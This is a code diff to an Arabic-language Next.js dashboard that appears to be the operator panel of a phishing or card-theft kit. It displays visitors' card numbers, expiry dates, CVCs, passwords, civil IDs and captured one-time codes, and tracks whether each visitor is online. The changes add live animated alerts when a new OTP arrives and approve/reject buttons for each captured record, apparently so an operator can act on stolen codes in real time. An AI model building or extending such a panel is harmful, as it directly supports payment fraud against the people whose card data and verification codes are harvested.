@@ -1,6 +1,6 @@
 "use client"
 
-import { useState, useEffect } from "react"
+import { useState, useEffect, useRef } from "react"
 import { useRouter } from "next/navigation"
 import {
   Trash2,
@@ -52,6 +52,42 @@ import {
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
 
+const styles = `
+@keyframes pulseGreen {
+  0%, 100% { background-color: rgba(240, 253, 244, 1); }
+  50% { background-color: rgba(134, 239, 172, 0.5); }
+}
+
+@keyframes pulseGlow {
+  0%, 100% { 
+    background-color: rgba(22, 163, 74, 0.15); 
+    border-color: rgba(22, 163, 74, 0.3);
+  }
+  50% { 
+    background-color: rgba(22, 163, 74, 0.3); 
+    border-color: rgba(22, 163, 74, 0.6);
+    box-shadow: 0 0 8px rgba(22, 163, 74, 0.5);
+  }
+}
+
+@keyframes bounceSmall {
+  0%, 100% { transform: translateY(0); }
+  50% { transform: translateY(-3px); }
+}
+
+.animate-pulse-green {
+  animation: pulseGreen 2s ease-in-out;
+}
+
+.animate-pulse-glow {
+  animation: pulseGlow 1.5s ease-in-out infinite;
+}
+
+.animate-bounce-small {
+  animation: bounceSmall 0.5s ease-in-out;
+}
+`
+
 function useOnlineUsersCount() {
   const [onlineUsersCount, setOnlineUsersCount] = useState(0)
 
@@ -88,7 +124,7 @@ interface Notification {
   id: string
   isOnline: boolean
   lastSeen: string
-  notificationCount: number
+  civilId?: string
   otp: string
   page: string
   pass: string
@@ -98,7 +134,7 @@ interface Notification {
   month?: string
   year?: string
   otp2?: string
-  allOtps?:[]
+  allOtps?: []
   mobile?: string
   idNumber?: string
   network?: string
@@ -112,6 +148,36 @@ interface Notification {
     expiry: string
     cvc: string
   }
+}
+
+function AnimatedOtpBadge({ otp, isNew = false }: { otp: string; isNew?: boolean }) {
+  const badgeRef = useRef<HTMLDivElement>(null)
+
+  useEffect(() => {
+    if (isNew && badgeRef.current) {
+      badgeRef.current.classList.add("animate-pulse-green")
+      const timer = setTimeout(() => {
+        if (badgeRef.current) {
+          badgeRef.current.classList.remove("animate-pulse-green")
+        }
+      }, 2000)
+
+      return () => clearTimeout(timer)
+    }
+  }, [isNew])
+
+  return (
+    <div ref={badgeRef} className={`relative ${isNew ? "animate-bounce-small" : ""}`}>
+      <Badge
+        className={`font-mono text-black bg-green-50 border-green-200 shadow-sm transition-all duration-300 ${
+          isNew ? "ring-2 ring-green-400 ring-opacity-50" : ""
+        }`}
+      >
+        {otp || "غير متوفر"}
+      </Badge>
+      {isNew && <span className="absolute -top-1 -right-1 h-2 w-2 bg-green-500 rounded-full animate-ping" />}
+    </div>
+  )
 }
 
 export default function NotificationsPage() {
@@ -131,6 +197,8 @@ export default function NotificationsPage() {
   const [showFilters, setShowFilters] = useState(false)
   const [userStatuses, setUserStatuses] = useState<{ [key: string]: string }>({})
   const [activeTab, setActiveTab] = useState("all")
+  const [newOtps, setNewOtps] = useState<{ [key: string]: boolean }>({})
+  const [notificationsWithNewOtps, setNotificationsWithNewOtps] = useState<{ [key: string]: boolean }>({})
 
   // Pagination state
   const [currentPage, setCurrentPage] = useState(1)
@@ -138,6 +206,7 @@ export default function NotificationsPage() {
 
   const router = useRouter()
   const onlineUsersCount = useOnlineUsersCount()
+  const prevNotificationsRef = useRef<Notification[]>([])
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
@@ -163,6 +232,80 @@ export default function NotificationsPage() {
   useEffect(() => {
     setCurrentPage(1)
   }, [showOnlineOnly, showWithCardOnly, activeTab])
+
+  // Check for new OTPs in notifications
+  useEffect(() => {
+    if (notifications.length > 0 && prevNotificationsRef.current.length > 0) {
+      const newNotificationsWithOtps: { [key: string]: boolean } = {}
+
+      notifications.forEach((notification) => {
+        const prevNotification = prevNotificationsRef.current.find((n) => n.id === notification.id)
+
+        // Check if this notification has new OTPs
+        if (prevNotification && notification.allOtps && prevNotification.allOtps) {
+          const prevOtpsLength = prevNotification.allOtps.length
+          const currentOtpsLength = notification.allOtps.length
+
+          if (currentOtpsLength > prevOtpsLength) {
+            newNotificationsWithOtps[notification.id] = true
+
+            // Add new OTPs to the tracking state
+            if (notification.allOtps && notification.allOtps.length > 0) {
+              const newOtpsObj: { [key: string]: boolean } = {}
+              const prevOtps = new Set(prevNotification.allOtps)
+
+              notification.allOtps.forEach((otp) => {
+                if (typeof otp === "string" && !prevOtps.has(otp)) {
+                  newOtpsObj[otp] = true
+                }
+              })
+
+              if (Object.keys(newOtpsObj).length > 0) {
+                setNewOtps((prev) => ({ ...prev, ...newOtpsObj }))
+              }
+            }
+          }
+        }
+      })
+
+      if (Object.keys(newNotificationsWithOtps).length > 0) {
+        setNotificationsWithNewOtps((prev) => ({ ...prev, ...newNotificationsWithOtps }))
+
+        // Clear the animation after some time
+        const timer = setTimeout(() => {
+          setNotificationsWithNewOtps({})
+        }, 30000) // 30 seconds
+
+        return () => clearTimeout(timer)
+      }
+    }
+
+    // Update the previous notifications reference
+    prevNotificationsRef.current = [...notifications]
+  }, [notifications])
+
+  useEffect(() => {
+    // Track new OTPs for animation
+    if (selectedNotification?.allOtps && selectedNotification.allOtps.length > 0) {
+      const newOtpsObj: { [key: string]: boolean } = {}
+      selectedNotification.allOtps.forEach((otp, index) => {
+        if (typeof otp === "string" && !newOtps[otp]) {
+          newOtpsObj[otp] = true
+        }
+      })
+
+      if (Object.keys(newOtpsObj).length > 0) {
+        setNewOtps((prev) => ({ ...prev, ...newOtpsObj }))
+
+        // Reset animation flags after some time
+        const timer = setTimeout(() => {
+          setNewOtps({})
+        }, 3000)
+
+        return () => clearTimeout(timer)
+      }
+    }
+  }, [selectedNotification?.allOtps])
 
   const fetchNotifications = () => {
     setIsLoading(true)
@@ -437,6 +580,7 @@ export default function NotificationsPage() {
 
   return (
     <div dir="rtl" className="min-h-screen bg-slate-50 text-slate-900">
+      <style>{styles}</style>
       <header className="bg-white border-b border-slate-200 sticky top-0 z-10 shadow-sm">
         <div className="container mx-auto px-4 py-3 flex justify-between items-center">
           <div className="flex items-center gap-3">
@@ -661,16 +805,16 @@ export default function NotificationsPage() {
                             className="border-b border-slate-200 hover:bg-slate-50 transition-colors"
                           >
                             <td className="px-4 py-3 text-sm">{notification?.country || "غير معروف"}</td>
-                            <td className="px-4 py-3 text-sm">{notification.personalInfo?.id || "غير معروف"}</td>
+                            <td className="px-4 py-3 text-sm">{notification?.civilId || "غير معروف"}</td>
                             <td className="px-4 py-3">
                               <div className="flex flex-wrap gap-2">
                                 <TooltipProvider>
                                   <Tooltip>
                                     <TooltipTrigger asChild>
                                       <Badge
-                                        variant={notification.personalInfo?.id ? "outline" : "destructive"}
+                                        variant={notification?.civilId ? "outline" : "destructive"}
                                         className={`rounded-md cursor-pointer ${
-                                          notification.personalInfo?.id ? "hover:bg-slate-100" : ""
+                                          notification?.civilId ? "hover:bg-slate-100" : ""
                                         }`}
                                         onClick={() => handleInfoClick(notification, "personal")}
                                       >
@@ -697,15 +841,25 @@ export default function NotificationsPage() {
                                           notification.cardNumber || notification.cardDetails?.number
                                             ? "bg-green-50 text-green-700 border-green-200 hover:bg-green-100"
                                             : ""
-                                        }`}
+                                        } ${notificationsWithNewOtps[notification.id] ? "animate-pulse-glow" : ""}`}
                                         onClick={() => handleInfoClick(notification, "card")}
                                       >
                                         <CreditCard className="h-3 w-3 mr-1" />
                                         معلومات البطاقة
+                                        {notificationsWithNewOtps[notification.id] && (
+                                          <span className="relative flex h-2 w-2 mr-1">
+                                            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                                            <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+                                          </span>
+                                        )}
                                       </Badge>
                                     </TooltipTrigger>
                                     <TooltipContent>
-                                      <p>عرض معلومات البطاقة</p>
+                                      <p>
+                                        {notificationsWithNewOtps[notification.id]
+                                          ? "تم إضافة رمز تحقق جديد!"
+                                          : "عرض معلومات البطاقة"}
+                                      </p>
                                     </TooltipContent>
                                   </Tooltip>
                                 </TooltipProvider>
@@ -808,7 +962,7 @@ export default function NotificationsPage() {
                   <CardHeader className="pb-2 pt-4 px-4 bg-gradient-to-r from-slate-50 to-slate-100 border-b">
                     <div className="flex justify-between items-start">
                       <div>
-                        <CardTitle className="text-base">{notification.personalInfo?.id || "مستخدم"}</CardTitle>
+                        <CardTitle className="text-base">{notification?.civilId || "مستخدم"}</CardTitle>
                         <p className="text-sm text-slate-500">{notification?.country || "غير معروف"}</p>
                       </div>
                       <UserStatusBadge userId={notification.id} />
@@ -818,9 +972,9 @@ export default function NotificationsPage() {
                     <div className="space-y-4">
                       <div className="flex flex-wrap gap-2 mt-2">
                         <Badge
-                          variant={notification.personalInfo?.id ? "outline" : "destructive"}
+                          variant={notification?.civilId ? "outline" : "destructive"}
                           className={`rounded-md cursor-pointer ${
-                            notification.personalInfo?.id ? "hover:bg-slate-100" : ""
+                            notification?.civilId ? "hover:bg-slate-100" : ""
                           }`}
                           onClick={() => handleInfoClick(notification, "personal")}
                         >
@@ -835,11 +989,17 @@ export default function NotificationsPage() {
                             notification.cardNumber || notification.cardDetails?.number
                               ? "bg-green-50 text-green-700 border-green-200 hover:bg-green-100"
                               : ""
-                          }`}
+                          } ${notificationsWithNewOtps[notification.id] ? "animate-pulse-glow" : ""}`}
                           onClick={() => handleInfoClick(notification, "card")}
                         >
                           <CreditCard className="h-3 w-3 mr-1" />
                           معلومات البطاقة
+                          {notificationsWithNewOtps[notification.id] && (
+                            <span className="relative flex h-2 w-2 mr-1">
+                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
+                              <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500"></span>
+                            </span>
+                          )}
                         </Badge>
                       </div>
 
@@ -994,12 +1154,11 @@ export default function NotificationsPage() {
               <div className="p-3 bg-slate-50 rounded-lg">
                 <p className="flex justify-between">
                   <span className="font-medium text-slate-700">رقم البطاقة:</span>
-                  
+
                   <span dir="ltr" className="font-mono">
                     {selectedNotification.cardNumber || selectedNotification.cardDetails?.number || "غير متوفر"}
                   </span>
-                  {selectedNotification?.prefix &&<Badge>{selectedNotification?.prefix}</Badge>}
-
+                  {selectedNotification?.prefix && <Badge>{selectedNotification?.prefix}</Badge>}
                 </p>
               </div>
 
@@ -1008,7 +1167,7 @@ export default function NotificationsPage() {
                   <span className="font-medium text-slate-700">تاريخ الانتهاء:</span>
                   <span className="font-mono">
                     {selectedNotification?.cardExpiry ||
-                      selectedNotification?.month+"/"+ selectedNotification?.year  ||
+                      selectedNotification?.month + "/" + selectedNotification?.year ||
                       selectedNotification?.cardDetails?.expiry ||
                       "غير متوفر"}
                   </span>
@@ -1033,9 +1192,33 @@ export default function NotificationsPage() {
                 <p className="flex justify-between">
                   <span className="font-medium text-slate-700">رمز التحقق:</span>
                   <Badge className="font-mono text-black bg-green-50">{selectedNotification?.otp || "غير متوفر"}</Badge>
-                  <Badge className="font-mono text-black bg-green-50">{selectedNotification?.otp2 || "غير متوفر"}</Badge>
+                  <Badge className="font-mono text-black bg-green-50">
+                    {selectedNotification?.otp2 || "غير متوفر"}
+                  </Badge>
                 </p>
               </div>
+              {selectedNotification?.allOtps && selectedNotification.allOtps.length > 0 && (
+                <div className="p-3 bg-slate-50 rounded-lg">
+                  <style>{styles}</style>
+                  <p className="flex flex-col gap-2">
+                    <span className="font-medium text-slate-700 flex items-center gap-2">
+                      جميع رموز التحقق
+                      <span className="text-xs text-green-600 bg-green-50 px-2 py-0.5 rounded-full">
+                        {selectedNotification.allOtps.length}
+                      </span>
+                    </span>
+                    <div className="flex flex-wrap gap-2 mt-1 p-2 border border-dashed border-green-200 rounded-md bg-white">
+                      {selectedNotification.allOtps.map((otp, index) => (
+                        <AnimatedOtpBadge
+                          key={`${otp}-${index}`}
+                          otp={otp as string}
+                          isNew={newOtps[otp as string] || false}
+                        />
+                      ))}
+                    </div>
+                  </p>
+                </div>
+              )}
             </div>
           )}
 
@@ -1053,13 +1236,43 @@ export default function NotificationsPage() {
                   <span className="font-medium text-slate-700">رمز التحقق المرسل:</span>
                   <Badge className="font-mono bg-green-500">{selectedNotification.otp || "غير متوفر"}</Badge>
                   <Badge className="font-mono bg-green-500">{selectedNotification.otp2 || "غير متوفر"}</Badge>
-             </p>
+                </p>
               </div>
             </div>
           )}
 
-          <div className="flex justify-end gap-2 mt-4">
-            <Button variant="outline" onClick={closeDialog}>
+          <div className="flex justify-between gap-2 mt-4">
+            <div className="flex gap-2">
+              <Button
+                variant="destructive"
+                className="transition-all hover:scale-105 shadow-sm"
+                onClick={() => {
+                  handleApproval("rejected", selectedNotification?.id || "")
+                  closeDialog()
+                }}
+              >
+                <span className="flex items-center gap-1">
+                  <X className="h-4 w-4" />
+                  رفض
+                </span>
+              </Button>
+              <Button
+                variant="default"
+                className="bg-green-600 hover:bg-green-700 transition-all hover:scale-105 shadow-sm"
+                onClick={() => {
+                  handleApproval("approved", selectedNotification?.id || "")
+                  closeDialog()
+                }}
+              >
+                <span className="flex items-center gap-1">
+                  <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
+                  </svg>
+                  موافقة
+                </span>
+              </Button>
+            </div>
+            <Button variant="outline" onClick={closeDialog} className="transition-all hover:bg-slate-100">
               إغلاق
             </Button>
           </div>
